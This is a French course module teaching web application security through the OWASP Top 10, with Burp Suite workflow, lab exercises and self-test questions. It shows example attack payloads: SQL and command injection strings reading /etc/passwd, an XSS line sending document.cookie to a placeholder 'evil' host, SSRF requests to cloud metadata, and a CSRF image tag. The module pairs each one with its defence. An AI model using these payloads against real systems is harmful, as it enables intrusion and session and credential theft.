# Module 07 — Sécurité web & OWASP

> **Objectif :** maîtriser les vulnérabilités des applications web. Le web est la **plus
> grande surface d'attaque** du monde et le point d'entrée le plus fréquent. C'est aussi la
> porte d'entrée du bug bounty et du pentest applicatif.
>
> **Durée :** 5 à 6 semaines · **Prérequis :** modules 00–06 (surtout 03 HTTP et 06 lecture de code)

> Ce module est dense et central. Prenez votre temps, faites **tous** les labs — la sécurité
> web ne s'apprend qu'en exploitant réellement les failles, encore et encore.

---

## 7.1 — Rappels : comment fonctionne le web

### Le cycle requête/réponse

```
Navigateur ──HTTP request──▶ Serveur web ──▶ Application ──▶ Base de données
    │                             (nginx/apache)   (PHP/Node/…)      (MySQL/…)
    ◀──HTTP response──────────────┘
```

### L'anatomie d'une requête HTTP

```
POST /login HTTP/1.1
Host: exemple.fr
Cookie: session=abc123
Content-Type: application/x-www-form-urlencoded
Content-Length: 29

username=alice&password=secret
```

**Tout est manipulable côté client :** URL, en-têtes, cookies, corps, méthode. La règle
d'or de la sécurité web en découle : **ne jamais faire confiance à quoi que ce soit venant
du navigateur.** Toute validation « côté client » (JavaScript) est cosmétique — elle
n'existe pas pour la sécurité.

### Les mécanismes de session

- **Cookies** — stockés côté navigateur, renvoyés à chaque requête. Attributs de sécurité :
  `HttpOnly` (inaccessible au JS → limite le vol par XSS), `Secure` (HTTPS uniquement),
  `SameSite` (limite l'envoi cross-site → défense CSRF).
- **Tokens (JWT)** — souvent en en-tête `Authorization: Bearer …` (voir module 02 pour les pièges).
- **Session serveur** — un identifiant opaque référence un état stocké côté serveur.

### La Same-Origin Policy et CORS

La **SOP** est le pilier de sécurité du navigateur : un script d'une origine
(`scheme://host:port`) ne peut pas lire les réponses d'une autre origine. **CORS** assouplit
cela de façon contrôlée. Une **mauvaise configuration CORS** (`Access-Control-Allow-Origin: *`
avec credentials, ou reflet naïf de l'origine) est une faille classique.

---

## 7.2 — L'OWASP Top 10 (2021) — la colonne vertébrale

L'**OWASP** (Open Worldwide Application Security Project) publie le classement des risques
web les plus critiques. À connaître **par cœur**, c'est la grille de lecture du métier.

| # | Catégorie | En une phrase |
|---|---|---|
| **A01** | Broken Access Control | On accède à ce qu'on ne devrait pas (IDOR, élévation) — **n°1** |
| **A02** | Cryptographic Failures | Données sensibles mal (ou pas) chiffrées |
| **A03** | Injection | SQL, commandes, LDAP… la donnée devient du code |
| **A04** | Insecure Design | La faille est dans la conception, pas le code |
| **A05** | Security Misconfiguration | Config par défaut, services exposés, verbeux |
| **A06** | Vulnerable & Outdated Components | Dépendances/bibliothèques vulnérables |
| **A07** | Identification & Auth Failures | Auth cassée, brute force, sessions faibles |
| **A08** | Software & Data Integrity Failures | Désérialisation, supply chain, updates non signées |
| **A09** | Security Logging & Monitoring Failures | On ne voit pas l'attaque |
| **A10** | Server-Side Request Forgery (SSRF) | Le serveur est forcé de requêter en interne |

> Nous traitons les catégories dans l'ordre pédagogique, pas numérique. Notez que le Top 10
> est révisé périodiquement (une édition 2025 est attendue) ; les catégories évoluent mais
> les mécanismes de fond restent.

---

## 7.3 — Injection (A03) : quand la donnée devient du code

Le principe unificateur de **toutes** les injections : une donnée contrôlée par l'attaquant
est interprétée comme du code par un interpréteur (SQL, shell, LDAP, XML, template…).

### Injection SQL (SQLi)

```php
// Code vulnérable
$q = "SELECT * FROM users WHERE user='$user' AND pass='$pass'";
```

En saisissant `' OR '1'='1' -- ` comme utilisateur :
```sql
SELECT * FROM users WHERE user='' OR '1'='1' -- ' AND pass='...'
```
La condition est toujours vraie, le reste est commenté → authentification contournée.

**Les variantes :**

| Type | Comment on exfiltre |
|---|---|
| **In-band / UNION** | Les résultats reviennent dans la page (`UNION SELECT`) |
| **Error-based** | Les messages d'erreur révèlent les données |
| **Blind boolean** | La page change selon vrai/faux (`AND 1=1` vs `AND 1=2`) |
| **Blind time-based** | On mesure un délai (`AND SLEEP(5)`) |
| **Out-of-band** | Exfiltration via DNS/HTTP déclenché par la requête |

**Méthodologie manuelle :**
1. Trouver l'injection (`'`, `"`, erreurs, comportements)
2. Déterminer le nombre de colonnes (`ORDER BY n`)
3. Trouver les colonnes affichées (`UNION SELECT 1,2,3`)
4. Extraire la structure (`information_schema.tables`, `.columns`)
5. Exfiltrer les données

**Impact maximal :** lecture/écriture de fichiers, RCE selon le SGBD, dump complet de la base.

**Défense (définitive) :** **requêtes préparées / paramétrées**. Accessoirement : ORM bien
utilisé, moindre privilège du compte SQL, WAF (défense en profondeur, jamais seule).

**Outil :** `sqlmap` automatise l'exploitation — **mais** apprenez d'abord à la main,
sinon vous ne comprendrez ni les faux négatifs ni les cas où l'outil échoue.

### Injection de commandes (Command Injection)

```php
system("ping -c 1 " . $_GET['host']);   // host = 8.8.8.8; cat /etc/passwd
```
`;`, `|`, `&&`, `$(...)`, backticks enchaînent des commandes. Mène directement au RCE.
**Défense :** éviter d'appeler le shell ; sinon, API sûres (`subprocess` avec liste
d'arguments, jamais `shell=True` avec de la donnée utilisateur), validation stricte.

### Les autres injections

- **LDAP injection** — contourner l'authentification d'annuaire
- **NoSQL injection** — ex. MongoDB : `{"user": {"$ne": null}}`
- **XXE (XML External Entity)** — un parseur XML lit des fichiers locaux ou fait du SSRF via des entités externes
- **SSTI (Server-Side Template Injection)** — `{{7*7}}` renvoie `49` → souvent RCE (Jinja2, Twig, Freemarker)
- **Injection d'en-têtes / CRLF** — manipuler la réponse HTTP

---

## 7.4 — Cross-Site Scripting (XSS)

L'attaquant injecte du JavaScript exécuté dans le navigateur d'une **autre** victime.
Ce n'est pas le serveur qui est compromis, mais la session de l'utilisateur.

### Les trois types

| Type | Où vit le payload | Exemple |
|---|---|---|
| **Réfléchi (reflected)** | Dans l'URL, renvoyé immédiatement | `?q=<script>...</script>` dans un lien piégé |
| **Stocké (stored)** | En base, servi à tous les visiteurs | Commentaire malveillant → le plus grave |
| **DOM-based** | Côté client, via du JS non sûr | `innerHTML = location.hash` |

### Ce qu'un attaquant en fait

```javascript
// Vol de cookie de session (si pas HttpOnly)
new Image().src = "https://evil/steal?c=" + document.cookie;
// Keylogger, défiguration, actions au nom de la victime, pivot vers le réseau interne (BeEF)
```

**Défense (par couches) :**
1. **Échappement contextuel en sortie** — encoder selon le contexte (HTML, attribut, JS, URL). C'est la défense principale.
2. **Content-Security-Policy (CSP)** — restreint les sources de script exécutables (défense en profondeur puissante).
3. **`HttpOnly`** sur les cookies de session (limite le vol).
4. Frameworks modernes (React, Angular) qui échappent par défaut — **mais** attention à `dangerouslySetInnerHTML` et consorts.
5. Sanitisation (DOMPurify) quand du HTML riche est nécessaire.

---

## 7.5 — Broken Access Control (A01) : la faille n°1

### IDOR (Insecure Direct Object Reference)

```
GET /api/invoice/1001     → votre facture
GET /api/invoice/1002     → celle du voisin, sans contrôle → IDOR
```

L'application référence un objet par un identifiant **sans vérifier que l'utilisateur y a
droit**. Trivial à trouver, dévastateur, omniprésent — et **la faille la plus rentable en
bug bounty**. Testez systématiquement : incrémenter/décrémenter les IDs, remplacer un UUID
par un autre, changer un paramètre `user_id`.

### Élévation de privilèges et autres

- **Verticale** — un utilisateur devient admin (`/admin` accessible, rôle modifiable côté client)
- **Horizontale** — accéder aux données d'un pair (l'IDOR en est un cas)
- **Forced browsing** — accéder à des URL non liées mais non protégées
- **Manipulation de paramètres** — `role=user` → `role=admin` dans une requête
- **Contournement de méthode** — un contrôle sur `GET` mais pas sur `POST`/`PUT`

**Défense :** contrôle d'autorisation **côté serveur, à chaque requête, pour chaque objet**
(médiation complète). **Deny by default.** Ne jamais s'appuyer sur le fait qu'une URL est
« cachée » ou qu'un bouton est masqué.

---

## 7.6 — SSRF (A10) et les failles côté serveur

### Server-Side Request Forgery

On force le serveur à émettre une requête vers une destination choisie par l'attaquant :

```
POST /fetch  url=http://169.254.169.254/latest/meta-data/    ← métadonnées cloud AWS
POST /fetch  url=http://localhost:8080/admin                 ← service interne
POST /fetch  url=file:///etc/passwd                          ← lecture de fichier
```

**Pourquoi c'est critique en 2020+ :** le SSRF est devenu **la** faille cloud majeure. Il
permet d'atteindre les endpoints de métadonnées (IMDS) et de voler des **credentials
temporaires IAM** — première marche d'une compromission cloud complète (module 12).

**Défense :** liste blanche de destinations, blocage des IP internes/link-local, IMDSv2
(qui exige un token), désactiver les schémas non-HTTP, résolution DNS contrôlée.

### CSRF (Cross-Site Request Forgery)

On piège la victime **authentifiée** pour qu'elle exécute une action à son insu :

```html
<img src="https://banque.fr/transfer?to=attaquant&amount=1000">
```

Le navigateur envoie automatiquement les cookies de session. **Défense :** jetons
anti-CSRF, `SameSite=Lax/Strict`, vérification de l'origine/referer.

### Désérialisation non sécurisée (A08)

Reconstruire un objet depuis des données contrôlées par l'attaquant peut mener au RCE
(gadget chains). Concerne Java (`ObjectInputStream`), PHP (`unserialize`), Python (`pickle`),
.NET. **Défense :** ne jamais désérialiser de données non fiables ; formats de données
« pauvres » (JSON) plutôt que sérialisation d'objets ; signature d'intégrité.

---

## 7.7 — Les autres catégories

### Security Misconfiguration (A05)
Config par défaut, comptes d'usine, répertoires listables, messages d'erreur verbeux,
consoles d'admin exposées, en-têtes de sécurité absents, buckets S3 ouverts, méthodes HTTP
inutiles activées. **Défense :** durcissement, revue de config, désactivation du superflu,
en-têtes (`HSTS`, `CSP`, `X-Content-Type-Options`, `X-Frame-Options`).

### Vulnerable Components (A06)
Une bibliothèque obsolète (Log4Shell, Struts…) suffit à compromettre l'application entière.
**Défense :** inventaire des dépendances (SBOM), analyse de composition logicielle (SCA),
mise à jour continue, veille CVE.

### Auth Failures (A07)
Brute force possible, mots de passe faibles acceptés, sessions non expirées, tokens
prévisibles, reset de mot de passe défaillant, absence de MFA. **Défense :** MFA, rate
limiting, verrouillage, politique de session, gestion sûre du « mot de passe oublié ».

### Logging & Monitoring Failures (A09)
Sans journalisation, une attaque passe inaperçue pendant des mois. **Défense :** journaliser
les événements de sécurité (auth, accès, erreurs), centraliser, alerter, protéger les logs.

---

## 7.8 — Burp Suite : l'outil central du pentest web

**Burp Suite** est le proxy d'interception qui définit le métier. L'édition Community suffit
pour apprendre.

### Les modules à maîtriser

| Module | Usage |
|---|---|
| **Proxy** | Intercepter, lire et modifier chaque requête/réponse |
| **Repeater** | Rejouer et modifier une requête manuellement — l'outil que vous utiliserez le plus |
| **Intruder** | Automatiser (fuzzing, brute force, énumération) — bridé en Community |
| **Decoder** | Encoder/décoder (base64, URL, hex…) |
| **Comparer** | Repérer les différences entre deux réponses |
| **Target / Sitemap** | Cartographier l'application |

### Le flux de travail type

```
1. Configurer le navigateur pour passer par le proxy Burp (127.0.0.1:8080)
2. Installer le certificat CA de Burp (pour intercepter le HTTPS)
3. Naviguer → construire la cartographie
4. Repérer un paramètre intéressant → l'envoyer au Repeater
5. Manipuler, observer, itérer → confirmer une faille
6. Documenter (requête, réponse, impact)
```

> **Alternative open source :** **OWASP ZAP**, gratuit et complet, excellent pour débuter
> et pour l'intégration CI/CD (DAST automatisé).

### Autres outils web à connaître

- `ffuf` / `gobuster` / `feroxbuster` — fuzzing de répertoires et de fichiers
- `nikto` — scanner de vulnérabilités web classiques
- `wpscan` — audit WordPress
- `sqlmap` — exploitation SQLi
- `nuclei` — scan par templates communautaires (très efficace en reconnaissance)
- `wappalyzer` — identification des technologies

---

## 7.9 — Méthodologie d'un test d'intrusion web

1. **Reconnaissance** — technologies, endpoints, sous-domaines, fichiers exposés (`robots.txt`, `.git`, sauvegardes)
2. **Cartographie** — parcourir l'application, cataloguer les entrées (paramètres, formulaires, en-têtes, cookies, API)
3. **Analyse des mécanismes** — authentification, sessions, gestion des rôles, logique métier
4. **Test systématique** — passer chaque point d'entrée au crible de l'OWASP Top 10
5. **Exploitation** — confirmer l'impact réel (PoC minimal, sans nuire)
6. **Documentation** — reproductibilité, impact, remédiation, criticité

Référence méthodologique complète : le **OWASP Web Security Testing Guide (WSTG)** et le
**OWASP ASVS** (niveaux de vérification). Ce sont vos check-lists professionnelles.

---

## ✅ Labs du module 07

- [ ] **Lab 7.1 — PortSwigger Web Security Academy.** **La meilleure ressource gratuite qui existe.** Faites les parcours SQLi, XSS, Access Control (IDOR), SSRF, CSRF, Authentication. Des dizaines de labs interactifs, gratuits, officiels. **Priorité absolue de ce module.**
- [ ] **Lab 7.2 — DVWA.** Exploitez chaque faille aux niveaux Low → Medium → High, en comprenant *pourquoi* la difficulté augmente (quelle défense a été ajoutée).
- [ ] **Lab 7.3 — OWASP Juice Shop.** Résolvez un maximum de défis (il y en a ~100, du trivial à l'expert). Suivez votre score.
- [ ] **Lab 7.4 — SQLi à la main puis sqlmap.** Sur DVWA/une cible de lab, exploitez une SQLi entièrement manuellement (UNION puis blind), puis confirmez avec sqlmap. Comparez.
- [ ] **Lab 7.5 — XSS complet.** Réalisez un vol de cookie via XSS stocké sur une appli de lab (avec un listener que vous contrôlez), puis corrigez avec échappement + CSP + HttpOnly et vérifiez l'échec de l'attaque.
- [ ] **Lab 7.6 — Burp Repeater.** Maîtrisez l'interception et la manipulation : modifiez un `user_id`, un rôle, une méthode HTTP, et trouvez un IDOR.
- [ ] **Lab 7.7 — SSRF cloud.** Dans un lab simulant IMDS, exploitez un SSRF pour atteindre les métadonnées, puis mettez en place IMDSv2/liste blanche et vérifiez la remédiation.
- [ ] **Lab 7.8 — Rapport.** Rédigez un vrai rapport de pentest web sur une des cibles : synthèse, findings priorisés (CVSS), preuves, remédiations. **Ce livrable est votre portfolio.**

---

## 🎯 Auto-évaluation

1. Pourquoi toute validation « côté client » est-elle sans valeur pour la sécurité ?
2. Écrivez un payload SQLi de contournement d'authentification et expliquez-le.
3. Différence entre XSS réfléchi, stocké et DOM ? Lequel est le plus grave et pourquoi ?
4. Qu'est-ce qu'un IDOR ? Comment le testez-vous ? Comment le corrige-t-on ?
5. Pourquoi le SSRF est-il devenu une faille cloud critique ? Quel est le rôle d'IMDSv2 ?
6. À quoi servent `HttpOnly`, `Secure`, `SameSite` sur un cookie ?
7. Quelle est la défense **définitive** contre la SQLi ? Contre la XSS ?
8. Décrivez le flux de travail Burp pour confirmer une vulnérabilité.
9. Citez les 10 catégories de l'OWASP Top 10 de mémoire.

---

**Suivant → [Module 08 : Pentest & Red Team](08-pentest-offensive.md)**
